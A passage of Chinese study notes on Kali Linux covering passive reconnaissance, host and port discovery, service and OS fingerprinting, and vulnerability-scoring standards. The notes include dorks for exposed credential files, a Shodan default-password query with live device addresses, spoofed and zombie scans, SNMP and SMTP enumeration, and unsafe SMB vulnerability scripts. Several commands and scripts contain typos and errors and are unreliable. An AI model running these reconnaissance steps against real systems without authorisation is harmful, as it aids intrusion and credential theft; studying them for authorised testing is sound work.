<li>dig @8.8.8.8 <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> mx</li>
<li>dig <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> any</li>
<li>反向查询: dig +noall +answer -x 8.8.8.8</li>
<li>bind版本信息:dig +noall +answer txt chaos VERSION.BAND @ns3.dnsv4.com</li>
<li>DNS追踪: dig +trace example.com</li>
<li>抓包比较递归查询,迭代查询过程的区别<br>DNS区域传输</li>
<li>dig @nsl.example.com example.com axfr</li>
<li>host -T -l sina.com 8.8.8.8<br>DNS 字典爆破</li>
<li>firece -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt</li>
<li>dnsdict6 -d4 -t 16 -x sina.com</li>
<li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li>
<li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li>
<li>dnscrecon -t std -d sina.com<br>DNS 注册信息</li>
<li>whois</li>
<li>whois -h whois.apnic.net 192.0.43.10</li>
<li>AFRINIC</li>
<li>APNIC</li>
<li>ARIN</li>
<li>IANA</li>
<li>ICANN</li>
<li>LACNIC</li>
<li>NRO</li>
<li>RIPE</li>
<li>InterNic<br>搜索引擎</li>
<li>公司新闻动态</li>
<li>重要雇员信息</li>
<li>机密文档/网络拓扑</li>
<li>用户名密码</li>
<li>目标系统软硬技术架构<br>SHODAN</li>
<li>搜索联网的设备</li>
<li>Banner:http,ftp,ssh,telnet</li>
<li><a href="https://www,shodan.io/" target="_blank" rel="noopener">https://www,shodan.io/</a></li>
<li>常见filter:</li>
<li>net (192.168.20.1)</li>
<li>city</li>
<li>country(CN,US)</li>
<li>port(80,21,22,23)</li>
<li>os</li>
<li>Hostname(主机或域名)</li>
<li>server </li>
<li>200 OK cisco country:IP</li>
<li>user:admin pass:password</li>
<li><a href="http://1.179.177.109:81/index.htm" target="_blank" rel="noopener">http://1.179.177.109:81/index.htm</a></li>
<li>linux upnp avtech<ul>
<li><a href="http://75.69.59.49:8000" target="_blank" rel="noopener">http://75.69.59.49:8000</a></li>
</ul>
</li>
<li><a href="https://account.shodan.io/" target="_blank" rel="noopener">https://account.shodan.io/</a></li>
<li><a href="https://www.shodan.io/explore" target="_blank" rel="noopener">https://www.shodan.io/explore</a></li>
<li>Add-Ons<br>Google 搜索</li>
<li>+ 充值 - 支付</li>
<li>北京的电子商务公司—北京 intitle:电子商务 intext 法人 intext 电话</li>
<li>阿里网站上的北京公司联系人-北京 site:alibaba.com inurl:contact</li>
<li>塞班司法案的PDF文档-SOX filetype.pdf</li>
<li>法国的支付相关页面-payment site:fr</li>
<li>Google搜索实例<ul>
<li>input:”level/15/exec/~/show”(交换机)</li>
<li>intitle:”netbotz appliance””ok”(摄像头)</li>
<li>inurl /admin/login.php(php登录界面 可爆破)</li>
<li>inurl:qq.txt(qq号)</li>
<li>filetype:xls “username | password”</li>
<li>input:ftp “password” filetype:xls site:baidu.com(ftp)</li>
<li>inurl:Service.pwd(微软漏洞)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<pre><code>- http://exploit-db.com/google-dorks(谷歌黑客数据库)(google hacking)
- 不同浏览器都有其特有的搜索语法,需熟悉</code></pre><blockquote>
<p>YANDEX</p>
</blockquote>
<ul>
<li>世界第四大搜索引擎-俄罗斯</li>
<li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li>
<li>偶尔有惊喜<blockquote>
<p>用户信息</p>
</blockquote>
</li>
<li>邮件,主机<ul>
<li>theharvester -d sina.com -l 300 -b google</li>
</ul>
</li>
<li>文件<ul>
<li>metagoofill -d microsoft.com -t pdf -l 200 -o test -f 1.html</li>
</ul>
</li>
</ul>
<blockquote>
<p>MELTAGO(收集信息)</p>
<ul>
<li>申请账号</li>
<li>登录使用<br>其他路径</li>
<li>社交网络</li>
<li>工商注册</li>
<li>新闻组/论坛</li>
<li>招聘网站</li>
<li><a href="http://www.archive.org/web/web.php(可查看不同年份的网站代码)" target="_blank" rel="noopener">http://www.archive.org/web/web.php(可查看不同年份的网站代码)</a><br>个人专属的密码字典</li>
<li>按个人信息生成其专属的密码字典</li>
<li>CUPP-Common User Password Profiler<ul>
<li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li>
<li>python cup.py -i<br>METADATA</li>
</ul>
</li>
<li>Exif图片信息(图片会记录GPS信息 默认打开)</li>
<li>Foca</li>
</ul>
</blockquote>
<blockquote>
<p>RECON-NG</p>
<ul>
<li>全特性的web侦查框架</li>
<li>基于Python开发</li>
<li>web 信息搜索框架</li>
<li>命令格式与msf一致</li>
<li>基于Python开发</li>
<li>使用方法:<ul>
<li>模块</li>
<li>数据库</li>
<li>报告</li>
</ul>
</li>
<li>DNS查询<ul>
<li>Google</li>
<li>Baidu</li>
<li>Bing</li>
<li>Yahoo</li>
<li>Brute force</li>
</ul>
</li>
<li>解析IP地址(查询数据库)</li>
<li>联系人</li>
<li>报告 </li>
<li>API</li>
</ul>
</blockquote>
<h2 id="Kali-Linux-从入门到精通-八-主动信息收集"><a href="#Kali-Linux-从入门到精通-八-主动信息收集" class="headerlink" title="  Kali Linux 从入门到精通(八)-主动信息收集"></a>  Kali Linux 从入门到精通(八)-主动信息收集</h2><blockquote>
<p>基本介绍 </p>
<ul>
<li>直接与目标系统交互通信</li>
<li>无法避免留下访问的痕迹</li>
<li>使用受控的第三方电脑进行探测<ul>
<li>使用代理或已经被控制的主机</li>
<li>做好被封杀的准本</li>
<li>使用噪声迷惑目标,淹没真实的探测流量</li>
</ul>
</li>
<li>扫描<ul>
<li>发送不同的探测,根据返回结果判断目标状态<br>发现<ul>
<li>识别活着的主机</li>
</ul>
</li>
<li>潜在的被攻击目标<ul>
<li>输出一个IP地址列表</li>
<li>2,3,4层发现<br>二层发现(渗透进目标系统后,发现内网其他信息)</li>
</ul>
</li>
</ul>
</li>
<li>优点:扫描速度快,可靠</li>
<li>缺点:不可路由</li>
<li>Arp协议:抓包<br>二层发现–arping命令:<ul>
<li>arping</li>
<li>arping 1.1.1.1 -c 1</li>
<li>arping 1.1.1.1 -d   (发现重复响应, 两个不同的MAC地址拥有同一个IP,而此时IP为网关地址,此时即为ARP欺骗,实现中间人攻击,窃取密码,篡改数据等恶意参数)</li>
<li>arping -c 1.1.1.1 | grep “bytes from” | cut -d”” -f 5 | cut -d “(“ -f 2 | cut -d”)” -f 1</li>
<li>脚本 <ul>
<li>arping1.sh eth0 &gt; addr</li>
<li>arping2.sh addrs<br>二层发现–nmap 在二层发现中的应用</li>
</ul>
</li>
</ul>
</li>
<li>nmap 1.1.1.1-254 -sn(可进行网段扫描 -sn表示不进行网段扫描)</li>
<li>nmap -iL iplist.txt -sn(可对文本文件进行扫描)</li>
<li>nmap很强大 后面单独介绍</li>
</ul>
</blockquote>
<blockquote>
<p>二层发现–Netdiscover</p>
<ul>
<li>专用于二层发现</li>
<li>可用于无线和交换环境</li>
<li>主动和被动探测<ul>
<li>主动<ul>
<li>netdiscover -i eth0 -r 1.1.1.0/24</li>
<li>netdiscover -l iplist.txt</li>
</ul>
</li>
<li>被动<ul>
<li>netdiscover -p   (将网卡置于混杂模式)</li>
<li>主动arp容易触发报警(入侵检测系统触发报警)<br>二层发现–Scapy </li>
</ul>
</li>
</ul>
</li>
<li>作为Python库进行调用</li>
<li>也可作为单独的工具使用</li>
<li>抓包,分析,创建.修改,注入流量</li>
<li>apt-get install python-gnuplot(处理报警信息)</li>
<li>Scapy<ul>
<li>ARP().display()</li>
<li>Sr1()</li>
</ul>
</li>
<li>Python 脚本<ul>
<li>Arp1.py<ul>
<li>subprocess:调用操作系统</li>
</ul>
</li>
<li>Arp2.py<br>发现-三层发现</li>
</ul>
</li>
<li>优点<ul>
<li>可路由</li>
<li>速度比较快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤</li>
</ul>
</li>
<li>IP,ICMP协议<br>三层发现-PING命令 </li>
<li>Ping 1.1.1.1 -c 2</li>
<li>Ping -R 1.1.1.1 / tracetoute 1.1.1.1</li>
<li>Ping 1.1.1.1 -c 1 | grep “bytes from” | cut -d” “ -f 4 | cut -d “:” -f 1</li>
<li>脚本<br> Ping.sh 1.1.1.0<br>三层发现-Scapy</li>
<li>OSI多层堆叠 手工生成ICMP包/ICMP</li>
<li>ip=IP()</li>
<li>ip.dst=”1.1.1.1”</li>
<li>ping=ICMP()</li>
<li>a=sr1(ip/ping)</li>
<li>a.display()</li>
<li>Ping 不存在的地址<ul>
<li>a=sr1(ip/icmp.timeout=1)</li>
</ul>
</li>
<li>a=sr1(IP(dst=”1.1.1.1”)/ICMP().timeout=1)</li>
<li>脚本<br>三层发现-nmap</li>
<li>nmap -sn 1.1.1.1-255</li>
<li>nmap -iL iplist.txt -sn<br>三层发现-fping</li>
<li>fping 1.1.1.1 -c 1</li>
<li>fping -g 1.1.1.1 1.1.1.2</li>
<li>fping -g 1.1.1.0/24</li>
<li>fping -f iplist.txt<br>三层发现-Hping</li>
<li>能够发送几乎所有TCP/IP包</li>
<li>功能强大但每次只能扫描一个目标:(</li>
<li>hping3 1.1.1.1 -icmp -c 2</li>
<li>for addr in$(seq 1 254):do hping3 1.1.1.$addr –icmp -c 1 &gt;&gt; handle.txt &amp; done<br>发现-四层发现</li>
<li>优点:<ul>
<li>可路由且结果可靠</li>
<li>不太可能被防火墙过滤</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
</li>
<li>缺点:<ul>
<li>基于状态过滤的防火墙可能过滤扫描</li>
<li>全端口扫描速度慢</li>
</ul>
</li>
<li>TCP<ul>
<li>未经过请求的ACK-RST(可用于判断主机是否存活)</li>
<li>SYN-SYN/ACK,RST</li>
</ul>
</li>
<li>UDP<ul>
<li>ICMP端口不可达,一去不复返<br>四层发现–Scapy(TCP发现)</li>
</ul>
</li>
<li>ACK-TCP Port–RST</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>i.dst=”<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a></li>
<li>t=TCP()</li>
<li>t.flags=’A’</li>
<li>r=(i/t)</li>
<li>a=sr1(r)</li>
<li>a.display()</li>
</ul>
</li>
<li>a=sr1(IP(dst=”<a href="http://www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1" target="_blank" rel="noopener">www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1</a>))</li>
<li>ACK_Ping.py<br>四层发现–Scapy(UDP发现)</li>
<li>UDP-UDP Port-ICMP</li>
<li>i=IP()</li>
<li>u=UDP()</li>
<li>u.dport=33333</li>
<li>r=(i/u)</li>
<li>a=sr1(r.timeout=1,verbose=1)</li>
<li>A.display()<ul>
<li>ICMP</li>
</ul>
</li>
<li>UDP_Ping.py<ul>
<li>UDP发现不可靠<br>四层发现-nmap</li>
</ul>
</li>
<li>nmap 1.1.1.1-254 -PU53 -sn</li>
<li>nmap 1.1.1.1-254 -PA80 -sn</li>
<li>nmap -iL iplist.txt -PA80 -sn<br>四层发现</li>
<li>hping3 -udp 1.1.1.1 -c 1</li>
<li>for addr in $(seq 1,254); do hping3 -udp 1.1.1.$addr -c 1 &gt;&gt; r.txt; done<ul>
<li>grep Unreachable.txt | cut -d” “ -f 5 | cut -d “=” -f 2</li>
<li>./udp_hping.sh 1.1.1.0</li>
</ul>
</li>
<li>hping3 1.1.1.1 -c 1 (TCP)<ul>
<li>hping3 1.1.1.1</li>
<li>./TCP_hping.sh</li>
<li>Flag 0–ACK.RST<br>端口扫描<ul>
<li>端口对应网服务及应用端程序</li>
<li>服务端程序的漏洞通过端口攻入</li>
<li>发现开发的端口</li>
<li>更具体的攻击面</li>
<li>攻击流程:发现活的IP-&gt;发现开发端口-&gt;通过端口漏洞攻入<br>端口扫描之UDP端口扫描</li>
<li>假设ICMP port-unreachable 响应代表端口关闭</li>
</ul>
</li>
<li>目标系统不响应ICMP port-unreachable时,可能产生误判<ul>
<li>完整的UDP应用层请求</li>
</ul>
</li>
<li>准确性高</li>
<li>耗时巨大<ul>
<li>具体操作</li>
<li>Scapy UDP Scan<ul>
<li>端口关闭:ICMP port-unreacheable</li>
<li>端口开放:没有回包</li>
<li>了解每一种基于UDP的应用层结构很有绷住</li>
<li>与三层相同的技术</li>
<li>误判</li>
</ul>
</li>
<li>Scapy <ul>
<li>sr1(IP(dst=”1.1.1.1”)/UDP(dport=53).timeout=1,verbose=1)</li>
</ul>
</li>
<li>./udp_scan.py 1.1.1.1 1 100<br>端口扫描(UDP)-nmap</li>
<li>Nmap</li>
<li>nmap -sU 1.1.1.1</li>
<li>默认的1000个参数</li>
<li>ICMP host-unreachable</li>
<li>nmap 1.1.1.1 -sU -p 53</li>
<li>nmap -iL iplist.txt -sU -p 1-220</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<blockquote>
<p>端口扫描(TCP)-nmap</p>
<ul>
<li>TCP 端口扫描<ul>
<li>基于连接的协议</li>
<li>三次握手<br><img src="https://s2.ax1x.com/2020/03/01/3ceOHS.png" alt="3ceOHS.png"></li>
<li>隐蔽扫描–syn<ul>
<li>不建立完整连接</li>
<li>应用日志不记录扫描行为-隐蔽</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<pre><code>- 僵尸扫描
- 端口开放状态:
 ![3cm9cq.png](https://s2.ax1x.com/2020/03/01/3cm9cq.png)
- 端口状态
 ![3cmCj0.png](https://s2.ax1x.com/2020/03/01/3cmCj0.png)
    - 极度隐蔽
    - 实施条件苛刻
    - 可伪造源地址
    - 选择僵尸机
       - 闲置系统
       - 系统使用递增的IPID
          - 0
          - 随机

- 全连接扫描
- 所有TCP扫描方式都是基于三次握手的变化来判断目标端口状态</code></pre><blockquote>
<p>隐蔽端口扫描</p>
<ul>
<li>Syn-syn.ack-rst</li>
<li>Scapy<ul>
<li>srl(IP(dst=”your ip address”)/TCP(dport=80),timeout=1,verbose=1)</li>
<li>./syn_scan.py</li>
</ul>
</li>
<li>namp<ul>
<li>nmap -sS 1.1.1.1 -p 80.21.25.110 443</li>
<li>nmap -sS 1.1.1.1 -p –65535 –open</li>
<li>nmap -sS 1.1.1.1 -p –open</li>
<li>nmap -sS -iL iplist.txt -p 80</li>
</ul>
</li>
<li>hping3<ul>
<li>hping3 1.1.1.1 –scan 80 -S</li>
<li>hping3 1.1.1.1 –scan [ip] -S</li>
<li>hping3 1.1.1.1 –scan 0-65535 -S</li>
<li>hping3 -c 10 -S –spoof [伪造IP] -p ++1 1.1.1.1.3<br>全连接端口扫描</li>
<li>Scapy </li>
<li>Syn扫描不需要raw packets</li>
<li>内核认为syn/ack是非法包,直接发rst中断连接</li>
<li>全连接扫描对scapy比较困难</li>
<li>sr1(IP(dst=”<a href="http://www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)" target="_blank" rel="noopener">www.baidu.com&quot;)/TCP(dport=22,flags=&#39;S&#39;)</a>)</li>
<li>./tcp_scan1.py</li>
<li>./tcp_scan2.py</li>
<li>iptables(Linux防火墙) -A OUTPUT -p tcp –tcp–flags RST RST -d “<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a> -j DROP</li>
<li>nmap</li>
<li>nmap -sT 1.1.1.1 -p 80</li>
<li>nmap -sT 1.1.1.1 -p 80.21.25</li>
<li>nmap -sT 1.1.1.1 -p 80-200</li>
<li>nmap -sT iplist.txt -p 80</li>
<li>默认1000个常用端口</li>
<li>dmiltry</li>
<li>功能简单,但使用简便</li>
<li>默认150个最常用的端口</li>
<li>dmiltry -p 172.16.36.135</li>
<li>dmiltry -p 172.16.36.135 -o output</li>
<li>nc</li>
<li>nc -nv -w 1 -z [your ip address ] 1-100</li>
<li>for x in ${seq 20 30}; do nc -nv -w 1 -z 1.1.1.1 $x; done | grep open</li>
<li>for x in $(seq 1 254); do nc -nv -w 1 -z 1.1.1.$x 80; done<br>僵尸扫描(条件苛刻 需要合格的僵尸机)</li>
<li>合格的僵尸机:xp系统,windows 2003 server</li>
<li>Scapy-zombie.py<ul>
<li>i=IP()</li>
<li>t=TCP()</li>
<li>rz=(i/f)</li>
<li>rt=(i/t)</li>
<li>rz[IP].dst=IPz</li>
<li>rz[TCP].dport=445</li>
<li>rt[IP].src=IPz</li>
<li>rt[IP].dst=IPt</li>
<li>rt[TCP].dport=22</li>
<li>az1=sr1(rz)  / at=sr1(rt)  / az2=sr1(rz)</li>
<li>az1.dsiplay() / az2.display()</li>
</ul>
</li>
<li>xp:僵尸机,metasploit:目标机,kali:扫描机</li>
<li>nmap</li>
</ul>
</li>
<li>发现僵尸机<ul>
<li>nmap -p445  <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> –script=ipideseq nse </li>
</ul>
</li>
<li>扫描目标<ul>
<li>nmap 172.16.36.135 -sl 172.16.36.134 -Pn -p 0-100<br>服务扫描</li>
</ul>
</li>
<li>识别开放端口上运行的应用</li>
<li>识别目标操作系统</li>
<li>提高攻击效率<ul>
<li>Banner捕获</li>
<li>服务识别</li>
<li>操作系统识别</li>
<li>SNMP分析</li>
<li>防火墙识别<br>Banner捕获</li>
</ul>
</li>
<li>软件开发商</li>
<li>软件名称</li>
<li>服务类型</li>
<li>版本号<ul>
<li>直接发现已知的漏洞和弱点</li>
</ul>
</li>
<li>连接建立后直接获取banner</li>
<li>另类服务识别方法<ul>
<li>特征行为和响应字段</li>
<li>不同的响应可用于识别底层操作系统</li>
</ul>
</li>
<li>基本操作<ul>
<li>way1: nc -nv [your ip address]</li>
<li>way2:python socket:socket 模块用于连接网络服务 </li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">banner.connect((&quot;www.baidu.com&quot;,21))</span><br><span class="line">banner.recv(4096)   # 接收数据大小</span><br><span class="line">banner.close()</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<pre><code>- Banner不允许抓取,recv无返回将挂起
- way3: 
    - dmitry -p www.baidu.com
    - dmitry -pb www.baidu.com
- way4:
    - nmap -sT [ip address] -p 22 --script=banner nse
- way5:
    - amap -B &quot;ip address&quot;
    - amap -B &quot;ip address&quot; 1-65535
    - amap -B &quot;ip address&quot; 1-65535 | grep on
    - amap [ip address]
    - amap [ip address] -q
    - amap [ip address] -qb</code></pre><ul>
<li>Banner 信息抓取能力有限</li>
<li>nmap响应特征分析识别服务<ul>
<li>发送系列复杂的探测</li>
<li>依据响应特征signature</li>
</ul>
</li>
<li>nc -nv 1.1.1.1 80</li>
<li>nmap 1.1.1.1 -p 80 -sV</li>
</ul>
<blockquote>
<p>SNMP</p>
<ul>
<li>简单网络管理协议</li>
<li>Community strings</li>
<li>信息查询或重新配置</li>
<li>识别和绕过防火墙筛选<br>操作系统识别<ul>
<li>操作系统识别技术</li>
<li>种类繁多</li>
<li>好产品采用多种技术组合</li>
<li>TTL起始值</li>
<li>Windows: 128(65-128)</li>
<li>Linux/Unix:64 (1-64)</li>
<li>某些Unix:255</li>
<li>python脚本</li>
</ul>
</li>
</ul>
</blockquote>
<pre><code>from scapy.all import *
win=&quot;1.1.1.1&quot;
lin=&quot;1.1.1.2&quot;
aw=sr1(IP(dst=win)/ICMP())
al=sr1(IP(dst=linu)/ICMP())
if al[IP].ttl&lt;64
   print &quot;host is linux&quot;
else
   print &quot;host is windows&quot;</code></pre><ul>
<li>nmap使用多种技术识别操作系统<ul>
<li>nmap 1.1.1.1 -O</li>
<li>系统服务特征</li>
</ul>
</li>
<li>xprobe2 1.1.1.1<ul>
<li>结果有误差</li>
</ul>
</li>
<li>被动操作系统识别<ul>
<li>IDS</li>
<li>抓包分析</li>
<li>被动扫描</li>
<li>p0f<ul>
<li>结合ARP地址欺骗识别全网OS<blockquote>
<p>SNMP扫描</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li>snmp(简单网络管理协议)<ul>
<li>信息的金矿</li>
<li>经常被错误配置</li>
<li>public/private/manager</li>
</ul>
</li>
<li>MIB Tree (查用常用操作系统和设备信息)<ul>
<li>SNMP Management information Base(MIB)</li>
<li>树形的网络设备管理功能数据库</li>
<li>1.3.6.1.4.77.1.2.25</li>
</ul>
</li>
<li>onesixtyone 1.1.1.1 public</li>
<li>onesixtyone -c dict.txt -i hosts -o my.log -w 100</li>
<li>snmpwalk 1.1.1.1 -c public -v 2c</li>
<li>用户<ul>
<li>snmpwalk -c public -v 2c 1.1.1.1 1.36.1.4.1.77.1.2.25</li>
</ul>
</li>
<li>snmpcheck -t [input ip address]</li>
<li>snmpcheck -t [input ip address] -c private -v 2</li>
<li>snmpcheck -t [input ip address] -w<blockquote>
<p>SMP 扫描</p>
<ul>
<li>Server Message Block协议<ul>
<li>微软历史上出现安全最多的协议</li>
<li>实现复杂</li>
<li>默认开放</li>
<li>文件共享</li>
<li>空会话未身份认证访问(SMBI)<ul>
<li>密码策略</li>
<li>用户名</li>
<li>组名</li>
<li>机器名</li>
<li>用户,组SID</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
</li>
<li>nmap -v -p139,445 192.168.60.1-20</li>
<li>nmap 192.168.60.4 -p139,445 –script=smb-os-discovery.nse</li>
<li>nmap -v -p139,445 –script=smb-vuln-*.nse –script-orgs=unsafe=1.1.1.1</li>
<li>namp:脚本位置: /usr/share/nmap/scripts</li>
<li>nbtscan -r 192.168.60.0/24</li>
<li>enum4linux -a 192.168.60.10<br><img src="https://s2.ax1x.com/2020/03/01/3cmkHU.png" alt="3cmkHU.png"><blockquote>
<p>SMTP 扫描</p>
<ul>
<li>nc -nv 1.1.1.1 25</li>
<li>VRFY root</li>
<li>nmap smtp.163.com -p25 –script=smtp-enum-users.nse –script-args=smtp-enum-users.methods={VRFY}</li>
<li>nmap smtp.163.com -p25 –script=smtp-open-relay.nse</li>
<li>smtp-user-enum -M VRFY -U users.txt -t 1.1.1.1</li>
<li>./smtp.py<br><img src="https://s2.ax1x.com/2020/03/01/3cmEEF.png" alt="3cmEEF.png"><br>防火墙识别</li>
</ul>
</blockquote>
</li>
<li>通过检查回包,可能识别端口是否经过防火墙过滤</li>
<li>设备多种多样,结果存在一定误差<br><img src="https://s2.ax1x.com/2020/03/01/3cmVN4.png" alt="3cmVN4.png"></li>
<li>scapy</li>
<li>python 脚本</li>
<li>namp <ul>
<li>nmap有系列防火墙检测功能</li>
<li>nmap -sA 172.16.36.135 -p 22<blockquote>
<p>负载均衡识别</p>
</blockquote>
</li>
</ul>
</li>
<li>广域网负载均衡<ul>
<li>DNS</li>
</ul>
</li>
<li>HTTP-Loadbalancing<ul>
<li>Nginx</li>
<li>Apache</li>
</ul>
</li>
<li>lbd <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></li>
<li>lbd mail.163.com <blockquote>
<p>WAF识别</p>
</blockquote>
</li>
<li>WEB应用防火墙</li>
<li>wafw00f -l</li>
<li>wafw00f <a href="http://www.microsoft.com" target="_blank" rel="noopener">http://www.microsoft.com</a></li>
<li>nmap <a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a> –script=http-waf-detect.nse</li>
<li>实际可绕过,需要使用机器学习,结合语法,词法几乎可完全避免sql等web攻击</li>
</ul>
<blockquote>
<p>NMPA补充(强大的扫描器)</p>
<ul>
<li>所有参数<ul>
<li>主机发现 <ul>
<li>sn: 不做端口扫描</li>
<li>Pn: 不管是否回复,扫描所有要扫的ip,再判断</li>
<li>PS/PA/PU/PY</li>
<li>PE/PP//PM</li>
<li>PO</li>
<li>-n/-R:不做DNS解析/做解析</li>
<li>–dns-servers</li>
<li>–traceroute<ul>
<li>扫描技术</li>
</ul>
</li>
<li>sS/sT/sWW</li>
<li>sU (UDP扫描)</li>
<li>scanflags</li>
<li>sI:僵尸扫描<ul>
<li>服务扫描(探测端口服务)</li>
</ul>
</li>
<li>sV</li>
<li>version–intensity</li>
<li>version-all<ul>
<li>脚本扫描</li>
<li>–script-updatedb</li>
<li>–script-help</li>
<li>操作系统检测</li>
<li>osscan-limit 限制操作系统检测</li>
<li>时间和性能相关</li>
<li>使得扫描经过一段时间进行重新扫描,不被发现</li>
<li>–scan-delay [time]</li>
<li>防火墙/IDS 欺骗,躲避</li>
<li>D:伪造源地址,增加噪声IP</li>
<li>S:欺骗源地址</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>zenmap(图形化nmap)</li>
</ul>
</blockquote>
<h2 id="Kali-Linux-从入门到精通-九-弱点扫描"><a href="#Kali-Linux-从入门到精通-九-弱点扫描" class="headerlink" title="Kali Linux 从入门到精通(九)-弱点扫描"></a>Kali Linux 从入门到精通(九)-弱点扫描</h2><blockquote>
<p>发现弱点</p>
<ul>
<li>发现漏洞<ul>
<li>基于端口服务扫描结果版本信息(速度慢)</li>
<li>搜索已公开的漏洞数据库(数量大)</li>
<li>使用弱点扫描器实现漏洞管理<br>从信息的维度定义漏洞管理</li>
</ul>
</li>
<li>信息收集<ul>
<li>扫描发现网络IP,OS,服务,配置,楼栋号</li>
<li>能力需求:定义扫描方式内容和目标</li>
</ul>
</li>
<li>信息管理<ul>
<li>格式化信息,并进行筛选,分组,定义优先级</li>
<li>能力需求:资产分组,指定所有者,向所有者报告漏洞</li>
</ul>
</li>
<li>信息输出<ul>
<li>向不同层级的人群展示足够的信息量</li>
<li>能力需求:生成报告,导出数据,与SIEM集成<br>弱点扫描类型</li>
</ul>
</li>
<li>主动扫描<ul>
<li>有身份验证</li>
<li>无身份验证<ul>
<li>被动扫描</li>
<li>镜像端口抓包</li>
<li>其他来源输入</li>
<li>基于Agent的扫描</li>
<li>支持平台有限<br>漏洞的基本概念</li>
</ul>
</li>
</ul>
</li>
<li>CVSS(Common Vulenrability Scoring System)<ul>
<li>通用漏洞评分系统</li>
<li>描述安全漏洞严重程度的统一评分方案</li>
<li>V 3 版本—2015年6月10日</li>
<li>Basic Metric:基础的恒定不变的弱点权重</li>
<li>Temporal Metric:依赖时间因素的弱点的权重<ul>
<li>Environment Metric:利用弱点的环境要求和实施难度的权重<br><img src="https://s2.ax1x.com/2020/03/01/3cmKjx.png" alt="3cmKjx.png"></li>
</ul>
</li>
</ul>
</li>
<li>CVSS<ul>
<li>CVSS是安全内容自动化协议(SCAP)的一部分</li>
<li>通常CVSS和CVE一同由美国国家漏洞库(NVD)发布并保持数据的更新</li>
<li>分值范围: 0-10</li>
<li>不同机构按CVSS分值的的定义威胁的中,高,低威胁级别</li>
<li>CVSS体现弱点的风险,威胁级别(serverity)表示弱点风险对企业的影响程度</li>
<li>CVSS分值是工业标准,但威胁级别不是<br><img src="https://s2.ax1x.com/2020/03/01/3cmlDK.png" alt="3cmlDK.png"></li>
</ul>
</li>
<li>Vulerabilty Reference</li>
<li>CVE(Common Vulenrable and Exposures)<ul>
<li>已公开的信息安全漏洞字典,统一的漏洞编号标准</li>
<li>MITRE公司负责维护(非盈利机构)</li>
<li>扫描器的大部分扫描项都对应一个CVE编号</li>
<li>实现不同厂商之间信息交换的统一标准<br><img src="https://s2.ax1x.com/2020/03/01/3cmQu6.png" alt="3cmQu6.png"><ul>
<li>CVE发布流程</li>
</ul>
</li>
<li>发现漏洞</li>
<li>CAN负责制定CVE ID</li>
<li>发布到CVE List —– CVE-2008-4250</li>
<li>MITRE 负责对内容进行编辑维护</li>
</ul>
</li>
<li>很多厂商维护自己的Vulnerability Refernce<ul>
<li>MS</li>
<li>MSKB</li>
</ul>
</li>
<li>其他Vulnerability Reference<ul>
<li>CERT TA08-297A</li>
<li>BID 31874</li>
<li>IAVM 2008-A-0081</li>
<li>OVAL OVAL6093</li>
</ul>
</li>
<li>OVAL(Open Vulenrabilty and Assessment Language)<ul>
<li>描述漏洞检测方法的机器可识别语言</li>
<li>详细的描述漏洞检测的技术细节,可导入自动化检测工具中实施</li>
<li>OVAL使用XML语言描述,包含了严密的语言逻辑</li>
</ul>
</li>
<li>CCE <ul>
<li>描述软件配置缺陷的一种标注化格式</li>
<li>在信息安全风险评估中,配置缺陷的检测是一项重要内容,使用CCE可以让配置缺陷以标准的方式展现出来,便于配置缺陷评估的可量化操作</li>
</ul>
</li>
<li>CPE(Common Product Enumernation)<ul>
<li>信息技术产品,系统,软件包的结构化命名规范,分类命名</li>
</ul>
</li>
<li>CWE(Common Weakness Enumeration)<ul>
<li>常见漏洞类型的字典,描述不同类型漏洞的特征(访问控制,信息泄露,拒绝服务)</li>
</ul>
</li>
<li>Security Content Automation Protocal(SCAP)<ul>
<li>SCAP 是一个集合了多种安全标准框架</li>
<li>6个元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF</li>
<li>目的是以标准的方法展示和操作安全数据</li>
<li>由NIST负责维护</li>
</ul>
</li>
<li>SCAP主要解决三个问题<ul>
<li>实现高层政策法规等到底层实施的落地(如FISMA,ISO2700系列)</li>
<li>将信息安全所设计的各个要素标准化(如统一漏洞命以及严重性度量)</li>
<li>将复杂的系统配置核查工作自动化</li>
</ul>
</li>
<li>SCAP是当前美国比较成熟的一套信息安全评估标准体系,其标准化,自动化的思想对信息安全行业产生了深远的影响</li>
<li>NVD(National Vulnerabilty Database)<ul>
<li>美国政府的漏洞管理标准数据</li>
<li>完全基于SCAP框架</li>
<li>实现自动化漏洞管理</li>
<li>包含一下库 <ul>
<li>安全检查列表</li>
<li>软件安全漏洞</li>
<li>配置错误</li>
